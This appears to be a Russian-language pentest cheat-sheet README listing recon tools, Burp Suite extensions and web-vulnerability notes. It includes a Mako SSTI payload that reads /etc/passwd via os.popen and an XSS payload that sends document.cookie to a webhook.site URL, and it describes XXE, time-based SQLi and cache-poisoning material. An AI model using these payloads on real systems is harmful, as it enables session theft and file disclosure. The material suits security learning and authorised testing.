# Hack Tips

## Разведка доменных имен

### [Cero](https://github.com/glebarez/cero)
Cero подключается к удалённым хостам и считывает доменные имена из сертификатов, предоставленных во время TLS-р�[...]  
- Извлекает сертификаты из любого протокола, работающего через TLS (не только HTTPS).  
- Позволяет указывать цели: доменные имена, IP-адреса и диапазоны CIDR (поддержка IPv6).

---

### [hakip2host](https://github.com/hakluke/hakip2host)
Инструмент для возврата связанных доменных имен по списку IP-адресов.  
- DNS PTR-поиски  
- Альтернативные имена субъектов (SAN) в SSL-сертификатах  
- Общие имена (CN) в SSL-сертификатах

---

### [httpx](https://github.com/projectdiscovery/httpx)
Быстрый и многоцелевой HTTP-инструментарий.  
- Позволяет запускать несколько тестов с помощью библиотеки.

---

### [waymore](https://github.com/xnl-h4ck3r/waymore)
Инструмент для поиска архивных ссылок через Wayback Machine.  
- Находит больше ссылок, чем другие инструменты.  
- Загружает архивные ответы и URL-адреса.

---

### [xnLinkFinder](https://github.com/xnl-h4ck3r/xnLinkFinder)
Поиск конечных точек и потенциальных параметров заданной цели.  
- Сканирование одного или нескольких доменов/URL  
- Поиск файлов и параметров в каталогах или файлах  
- Импорт из Burp (XML), ZAP (ASCII), Caido (CSV)  
- Интеграция с результатами waymore

---

## Burp Suite — полезные расширения

### Turbo Intruder
Мощное расширение для проведения высокоскоростных атак (brute-force, fuzzing) с помощью скриптов на Python.  
- Кастомизация логики атаки  
- Обработка ответов для поиска уязвимостей

#### turbo-intruder_script.py
Скрипт для проведения Time-Based SQL Injection с использованием расширения Turbo Intruder для Burp Suite. Скрипт перебирает символы для извлечения схем из базы данных через подстановку значений из файла символов и анализирует задержку в ответах для определения успешных угадываний.

---

### Copy as FFUF Command
Упрощает экспорт запросов из Burp Suite для ffuf.  
- Автоматически формирует команду ffuf по выбранному запросу

### Hackvertor
Расширение для преобразования и кодирования данных в Burp Suite.  
- Большое количество кодировок  
- Удобно для генерации payload'ов, обхода фильтров и анализа данных

### Param Miner
Автоматически ищет скрытые и нестандартные параметры в веб-приложениях.  
- Позволяет находить дополнительные точки атаки

### HackBar
Интерактивное расширение для тестирования и манипулирования HTTP-запросами прямо из Burp Suite.  
- Позволяет быстро конструировать и модифицировать payload'ы  
- Включает функции для кодирования/декодирования (URL, Base64 и др.)  
- Удобно для проведения ручного тестирования (XSS, SQLi, LFI и др.)  
- Поддерживает работу с cookie, заголовками и параметрами  
- Имеет панель быстрого доступа прямо в окне запроса

---

## Веб-уязвимости

### SSTI (Server-Side Template Injection) в Python

#### Mako Templates
- Проверка уязвимости:  
  ```python
  ${7*7}  # → 49
  ```
- Чтение файла:  
  ```python
  <% import os %>${os.popen('cat /etc/passwd').read()}
  ```

---

### XSS Payload

```html
<img src=x onerror="this.src='https://webhook.site/b8ce3f5c-707d-406f-a8df-0dd7928bca42?c='+document.cookie;">
```

#### exploit.svg
Пример SVG-файла с использованием встраивания XML External Entity (XXE). Содержит сущность, ссылающуюся на файл `/etc/passwd`, что может быть использовано для демонстрации или тестирования XXE-уязвимостей.

---

## LFI (Local File Inclusion)

- **Top 25 LFI Parameters** — [файл](https://github.com/felixsta/hack_tips/blob/main/Top_25_LFI_Parameters)  
- **LFI Wordlists:**  
  - [SecLists/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)  
  - [DragonJAR/Security-Wordlist/main/LFI-WordList-Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)

#### delimiter_list
Список символов-разделителей, используемый для подбора полезной нагрузки при отравлении кэша (cache poisoning). Содержит различные символы и их URL-кодированные варианты, которые помогают обходить фильтры и изменять поведение кэширования на стороне сервера во время проведения атак или fuzzing.

---

## SQLi (SQL Injection)
- [Stacked Queries](https://www.sqlinjection.net/stacked-queries/)  
- [Pentestmonkey SQLi Cheat Sheet](https://pentestmonkey.net/category/cheat-sheet/sql-injection)

---
## jQuery
- `jquery.fn.jquery` в `jQuery` возвращает строку, содержащую текущую версию библиотеки `jQuery`. Например, если вы используете `jQuery 3.7.0`, то `jquery.fn.jquery` вернет `3.7.0`
